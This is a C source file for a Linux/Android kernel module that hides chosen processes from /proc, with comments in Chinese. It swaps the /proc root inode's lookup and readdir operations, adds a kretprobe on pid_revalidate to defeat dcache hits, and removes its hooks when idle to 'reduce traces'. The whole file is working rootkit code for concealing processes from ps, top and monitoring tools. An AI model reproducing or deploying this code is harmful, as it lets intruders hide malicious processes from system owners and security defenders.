/* hide_proc.c — /proc/<pid> 隐藏
 *
 * 思路:换掉 /proc 根 inode 的 i_op->lookup 与 fop->iterate_shared,
 * 命中 hidden_pids 的 pid 就让 lookup 返 -ENOENT、readdir 跳过该项。
 *
 * 单做这一层不够 —— pid_dentry_operations->d_revalidate 对活着的 task
 * 直接返 valid,VFS 走 dcache 命中根本不调 lookup。所以再挂一个
 * pid_revalidate kretprobe,命中 hidden 名时强转成 invalid,逼 VFS
 * 走 inode->lookup 落到我们的 hook。
 *
 * hide_process / unhide_process 是 hide.h 暴露的接口,管:
 *   - 把 pid 加进 / 移出 hidden_pids 表
 *   - 触发 d_drop 让 dcache 命中失效
 */
#include "hide_proc.h"
#include "hide_internal.h"
#include "nbg_ksyms.h"
#include "nbg_compat.h"
#include "nbg_log.h"

#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/slab.h>
#include "nbg_alloc.h"
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/rcupdate.h>
#include <linux/srcu.h>
#include <linux/module.h>
#include <asm/ptrace.h>

/* ===================== /proc 根 inode 钩子 ===================== */

static struct inode_operations  proc_new_iop;
static struct file_operations   proc_new_fop;
static const struct inode_operations *proc_orig_iop = NULL;
static const struct file_operations  *proc_orig_fop = NULL;
static struct inode              *proc_root_inode    = NULL;
DEFINE_STATIC_SRCU(proc_root_srcu);

static struct dentry *(*orig_proc_root_lookup)(struct inode *, struct dentry *, unsigned int) = NULL;
static int            (*orig_proc_root_readdir)(struct file *, struct dir_context *)          = NULL;

/* lookup hook:命中 hidden 直接返 -ENOENT */
NBG_NO_CFI
static struct dentry *hooked_proc_root_lookup(struct inode *dir,
                                               struct dentry *dentry,
                                               unsigned int flags)
{
    struct dentry *ret;
    int idx;

    idx = nbg_srcu_read_lock(&proc_root_srcu);
    if (proc_name_is_hidden_pid(dentry->d_name.name, dentry->d_name.len))
        ret = ERR_PTR(-ENOENT);
    else if (orig_proc_root_lookup)
        ret = orig_proc_root_lookup(dir, dentry, flags);
    else
        ret = ERR_PTR(-ENOENT);
    srcu_read_unlock(&proc_root_srcu, idx);
    return ret;
}

/* iterate_shared 过滤上下文:转发原始 ctx,但插入自定义 actor */
struct proc_filter_ctx {
    struct dir_context  ctx;
    struct dir_context *orig;
};

NBG_NO_CFI
static FILLDIR_RETURN_TYPE hooked_proc_filldir(struct dir_context *ctx,
                                 const char *name, int namlen,
                                 loff_t offset, u64 ino, unsigned int d_type)
{
    struct proc_filter_ctx *fctx = container_of(ctx, struct proc_filter_ctx, ctx);

    if (proc_name_is_hidden_pid(name, namlen))
        return FILLDIR_CONTINUE;
    return fctx->orig->actor(fctx->orig, name, namlen, offset, ino, d_type);
}

NBG_NO_CFI
static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
{
    int ret;
    int idx;
    struct proc_filter_ctx fctx = {
        .ctx  = { .actor = hooked_proc_filldir, .pos = ctx->pos },
        .orig = ctx,
    };

    idx = nbg_srcu_read_lock(&proc_root_srcu);
    if (orig_proc_root_readdir)
        ret = orig_proc_root_readdir(file, &fctx.ctx);
    else
        ret = -ENOENT;
    ctx->pos = fctx.ctx.pos;
    srcu_read_unlock(&proc_root_srcu, idx);
    return ret;
}

/* ===================== pid_revalidate kretprobe =====================
 *
 * 没这层 hook,dcache 命中走 d_revalidate(返回 1=valid)就绕过 lookup。
 * 我们对 hidden 名强转成 invalid,VFS 必走一次 inode->lookup 落进上面
 * 那个 hooked_proc_root_lookup。
 */

struct pid_reval_data { struct dentry *dentry; };

static struct kretprobe pid_reval_krp;
static bool pid_reval_hooked = false;
static DEFINE_MUTEX(pid_reval_lock);

static int pid_reval_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct pid_reval_data *d = (struct pid_reval_data *)ri->data;
    /* 零隐藏 pid 时直接 return 1,让 kretprobe 不要触发 ret handler。
     * pid_revalidate 是全机热路径(ps/top 每个 pid 一次,Android
     * ActivityManager 进程枚举更频繁),这条短路把"无隐藏时"开销降为
     * 0 — 仅 atomic_read 几纳秒。 */
    if (hidden_pids_empty())
        return 1;
    d->dentry = (struct dentry *)regs->regs[0];
    return 0;
}

static int pid_reval_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct pid_reval_data *d = (struct pid_reval_data *)ri->data;
    struct dentry *dentry = d->dentry;
    int rv;

    if (!dentry)
        return 0;

    rv = (int)regs_return_value(regs);
    if (rv == 0)
        return 0;       /* 已被判 invalid 不动 */

    if (proc_name_is_hidden_pid(dentry->d_name.name, dentry->d_name.len)) {
        /* 把返回值改成 0(invalid) -> VFS d_invalidate + 重走 inode->lookup */
        regs_set_return_value(regs, 0);
    }
    return 0;
}

static int install_pid_reval_hook(void)
{
    int ret;

    mutex_lock(&pid_reval_lock);
    if (pid_reval_hooked) {
        mutex_unlock(&pid_reval_lock);
        return 0;
    }

    /* 多候选符号:不同 vendor 改名过,5.x 部分版本叫 proc_pid_revalidate */
    {
        static const char * const cands[] = {
            "pid_revalidate", "proc_pid_revalidate", "pid_revalidate_ext", NULL
        };

        memset(&pid_reval_krp, 0, sizeof(pid_reval_krp));
        pid_reval_krp.entry_handler  = pid_reval_entry;
        pid_reval_krp.handler        = pid_reval_ret;
        pid_reval_krp.data_size      = sizeof(struct pid_reval_data);
        pid_reval_krp.maxactive      = max(num_possible_cpus() * 4, 64U);

        ret = nbg_register_kretprobe_named(&pid_reval_krp, cands, NULL);
    }
    if (ret) {
        mutex_unlock(&pid_reval_lock);
        return ret;
    }
    pid_reval_hooked = true;
    mutex_unlock(&pid_reval_lock);
    return 0;
}

static void remove_pid_reval_hook(void)
{
    mutex_lock(&pid_reval_lock);
    if (pid_reval_hooked) {
        unregister_kretprobe(&pid_reval_krp);
        pid_reval_hooked = false;
    }
    mutex_unlock(&pid_reval_lock);
}

/* ===================== install / remove(总开关)===================== */

static DEFINE_MUTEX(proc_hook_lock);
static bool proc_hooked = false;

NBG_NO_CFI
int install_proc_hook(void)
{
    struct path proc_path;
    int ret;

    mutex_lock(&proc_hook_lock);
    if (proc_hooked) {
        mutex_unlock(&proc_hook_lock);
        return 0;
    }

    if (!my_kern_path || !my_path_put) {
        ret = hide_init_path_functions();
        if (ret) {
            NBG_FAIL_CODE(1301, ret);
            mutex_unlock(&proc_hook_lock);
            return ret;
        }
    }

    ret = my_kern_path("/proc", LOOKUP_DIRECTORY, &proc_path);
    if (ret) {
        NBG_FAIL_CODE(1302, ret);
        mutex_unlock(&proc_hook_lock);
        return ret;
    }

    proc_root_inode = d_inode(proc_path.dentry);
    inode_lock(proc_root_inode);
    proc_orig_iop   = proc_root_inode->i_op;
    proc_orig_fop   = proc_root_inode->i_fop;

    orig_proc_root_lookup  = proc_orig_iop->lookup;
    orig_proc_root_readdir = proc_orig_fop->iterate_shared;

    memcpy(&proc_new_iop, proc_orig_iop, sizeof(proc_new_iop));
    memcpy(&proc_new_fop, proc_orig_fop, sizeof(proc_new_fop));
    proc_new_iop.lookup         = hooked_proc_root_lookup;
    proc_new_fop.iterate_shared = hooked_proc_root_readdir;
    /* A struct file keeps its f_op after inode->i_fop is restored. Pin this
     * module for those already-open /proc directory descriptors so rmmod
     * cannot unmap proc_new_fop or hooked_proc_root_readdir underneath them. */
    proc_new_fop.owner           = THIS_MODULE;

    WRITE_ONCE(proc_root_inode->i_op,  &proc_new_iop);
    WRITE_ONCE(proc_root_inode->i_fop, &proc_new_fop);
    inode_unlock(proc_root_inode);

    my_path_put(&proc_path);
    proc_hooked = true;
    mutex_unlock(&proc_hook_lock);

    /* 配套挂 pid_revalidate kretprobe;失败不致命,只是退化成"dcache
     * 命中可能绕过 lookup hook"的旧行为。 */
    ret = install_pid_reval_hook();
    NBG_FAIL_CODE(1303, ret);
    return 0;
}

void remove_proc_hook(void)
{
    mutex_lock(&proc_hook_lock);
    if (!proc_hooked) {
        mutex_unlock(&proc_hook_lock);
        return;
    }

    if (proc_root_inode) {
        inode_lock(proc_root_inode);
        WRITE_ONCE(proc_root_inode->i_op,  proc_orig_iop);
        WRITE_ONCE(proc_root_inode->i_fop, proc_orig_fop);
        inode_unlock(proc_root_inode);
    }

    synchronize_srcu(&proc_root_srcu);

    proc_root_inode       = NULL;
    proc_orig_iop         = NULL;
    orig_proc_root_lookup = NULL;
    /* Keep the original iterator cached for files opened before the restore.
     * Their f_op remains proc_new_fop until close, and proc_new_fop.owner
     * keeps this module resident for exactly that interval. */
    proc_hooked            = false;
    mutex_unlock(&proc_hook_lock);

    remove_pid_reval_hook();
}

/* ===================== hide_process / unhide_process =====================
 *
 * hidden_process 结构体定义在 hide_internal.h。
 */

NBG_NO_CFI
int hide_process(pid_t pid_nr)
{
    struct task_struct *task;
    struct pid *pid_ref;
    struct hidden_process *hp;
    struct path proc_pid_path;
    bool got_proc_pid_path = false;
    int pret;

    hp = nbg_kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp) {
        NBG_FAIL_CODE(1311, -ENOMEM);
        return -ENOMEM;
    }
    hp->pid = pid_nr;
    hp->proc_dentry = NULL;

    /* 重复隐藏检测 — 走哈希,O(1) */
    {
        struct hidden_process *exist;
        bool dup = false;
        rcu_read_lock();
        hlist_for_each_entry_rcu(exist,
            &hidden_pids_ht[((u32)pid_nr) & ((1U << HIDDEN_PIDS_HBITS) - 1)],
            hnode) {
            if (exist->pid == pid_nr) { dup = true; break; }
        }
        rcu_read_unlock();
        if (dup) {
            kfree(hp);
            return 0;       /* 已隐藏 */
        }
    }
    /* 必须在 list_add 之前抓 /proc/<pid> 的 dentry。一旦加进 hidden_pids,
     * 我们自己的 hooked_proc_root_lookup 会拒掉这个路径 → 拿不到 dentry,
     * d_drop 也就无从下手。 */
    if (!my_kern_path)
        hide_init_path_functions();
    if (my_kern_path) {
        char buf[32];
        snprintf(buf, sizeof(buf), "/proc/%d", pid_nr);
        if (my_kern_path(buf, 0, &proc_pid_path) == 0) {
            hp->proc_dentry = dget(proc_pid_path.dentry);
            got_proc_pid_path = true;
        }
    }

    /* 先安装 /proc 根 hook，再写 hidden_pids。这样安装失败不会留下
     * “pid 已登记、/proc 未接管”的半隐藏状态。 */
    pret = install_proc_hook();
    if (pret) {
        if (got_proc_pid_path)
            my_path_put(&proc_pid_path);
        if (hp->proc_dentry)
            dput(hp->proc_dentry);
        kfree(hp);
        NBG_FAIL_CODE(1313, pret);
        return pret;
    }

    /*
     * 用 get_pid_task 拿稳定 task 引用确认 pid 存活。默认路径不触碰
     * task_struct->tasks 全局链表，避免进程退出和全局遍历期间的链表风险。
     */
    pid_ref = find_get_pid(pid_nr);
    task = pid_ref ? get_pid_task(pid_ref, PIDTYPE_PID) : NULL;
    if (pid_ref)
        put_pid(pid_ref);
    if (!task || (READ_ONCE(task->flags) & PF_EXITING)) {
        if (task)
            put_task_struct(task);
        if (got_proc_pid_path) my_path_put(&proc_pid_path);
        if (hp->proc_dentry)
            dput(hp->proc_dentry);
        kfree(hp);
        if (hidden_pids_empty())
            remove_proc_hook();
        NBG_FAIL_CODE(1312, task ? -EBUSY : -ESRCH);
        return task ? -EBUSY : -ESRCH;
    }

    put_task_struct(task);

    /* 同步更新 list_head(批量遍历) + 哈希表(O(1) 查询) + count 短路计数器。
     * hlist_add_head_rcu 让正在读 bucket 的 RCU reader 看不到中间态。 */
    spin_lock(&hidden_pids_lock);
    list_add(&hp->list, &hidden_pids);
    hlist_add_head_rcu(&hp->hnode,
        &hidden_pids_ht[((u32)pid_nr) & ((1U << HIDDEN_PIDS_HBITS) - 1)]);
    atomic_inc(&hidden_pid_count);
    spin_unlock(&hidden_pids_lock);

    /* 用 d_drop 而非 d_invalidate:对活 task,pid_revalidate 会把
     * d_invalidate 挑出来重新激活 dentry,d_drop 直接从 dcache 哈希
     * 链摘除,下次 path walker 必走 i_op->lookup → 命中我们的 hook。 */
    if (got_proc_pid_path) {
        if (my_d_drop)
            my_d_drop(proc_pid_path.dentry);
        else
            nbg_dcache_invalidate(proc_pid_path.dentry);
        my_path_put(&proc_pid_path);
    }
    return 0;
}

int unhide_process(pid_t pid_nr)
{
    struct hidden_process *hp, *tmp;
    struct dentry *saved_proc_dentry = NULL;
    int found = 0;
    unsigned long flags;
    bool empty;

    /* 同时从 list_head + 哈希表脱链;count 同步减。 */
    spin_lock(&hidden_pids_lock);
    list_for_each_entry_safe(hp, tmp, &hidden_pids, list) {
        if (hp->pid == pid_nr) {
            list_del(&hp->list);
            hlist_del_rcu(&hp->hnode);
            atomic_dec(&hidden_pid_count);
            found = 1;
            break;
        }
    }
    spin_unlock(&hidden_pids_lock);

    if (!found)
    {
        NBG_FAIL_CODE(1321, -ENOENT);
        return -ENOENT;
    }
    /* 等 RCU reader 退出后再 free,否则读端 hlist_for_each_entry_rcu 可能
     * 解引用悬空内存。 */
    saved_proc_dentry = hp->proc_dentry;
    hp->proc_dentry = NULL;
    kfree_rcu(hp, rcu);

    /* hide_process() 会主动 d_drop(/proc/<pid>)。如果这里只移除记录而
     * 不刷新该 dentry，VFS 可能继续复用隐藏期间的 negative dentry，
     * 造成 ioctl 返回成功但 /proc/<pid> 仍不可见。此时记录已经移除，
     * kern_path 可以安全地重新取得该 dentry，再让下一次访问走正常
     * procfs lookup。 */
    if (saved_proc_dentry) {
        if (d_is_positive(saved_proc_dentry))
            nbg_dcache_rehash(saved_proc_dentry);
        dput(saved_proc_dentry);
    } else if (!my_kern_path)
        hide_init_path_functions();
    if (!saved_proc_dentry && my_kern_path) {
        char buf[32];
        struct path proc_root_path;
        struct dentry *fresh;

        snprintf(buf, sizeof(buf), "%d", pid_nr);
        if (my_kern_path("/proc", LOOKUP_DIRECTORY, &proc_root_path) == 0) {
            fresh = nbg_lookup_one_len_unlocked(buf, proc_root_path.dentry,
                                                (int)strlen(buf));
            if (!IS_ERR_OR_NULL(fresh) && d_is_negative(fresh)) {
                nbg_dcache_invalidate(fresh);
                dput(fresh);
                fresh = nbg_lookup_one_len_unlocked(
                    buf, proc_root_path.dentry, (int)strlen(buf));
            }
            if (!IS_ERR_OR_NULL(fresh))
                dput(fresh);
            my_path_put(&proc_root_path);
        }
    }
    /* 列表已空 → 把 /proc 根 hook 也卸了,减少痕迹 */
    spin_lock_irqsave(&hidden_pids_lock, flags);
    empty = list_empty(&hidden_pids);
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    if (empty)
        remove_proc_hook();
    return 0;
}

#define NBG_HIDDEN_SIGNAL_MAX 64U

int signal_hidden_processes(int sig, u32 *matched_out, u32 *delivered_out)
{
    struct hidden_process *hp;
    pid_t pids[NBG_HIDDEN_SIGNAL_MAX];
    unsigned long flags;
    u32 matched = 0;
    u32 copied = 0;
    u32 delivered = 0;
    u32 i;

    if (sig != 0 && sig != SIGTERM && sig != SIGKILL)
        return -EINVAL;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry(hp, &hidden_pids, list) {
        matched++;
        if (copied < ARRAY_SIZE(pids))
            pids[copied++] = hp->pid;
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    for (i = 0; i < copied; ++i) {
        struct pid *pid_ref = find_get_pid(pids[i]);

        if (sig != 0 && pid_ref) {
            if (kill_pid(pid_ref, sig, 1) == 0)
                delivered++;
        }
        if (pid_ref)
            put_pid(pid_ref);

        /* SIGTERM lets the helper perform its normal cleanup. SIGKILL is the
         * forced fallback, so remove the stale hide record immediately. */
        if (sig == SIGKILL)
            (void)unhide_process(pids[i]);
    }

    if (matched_out)
        *matched_out = matched;
    if (delivered_out)
        *delivered_out = delivered;
    return matched > copied ? -E2BIG : 0;
}
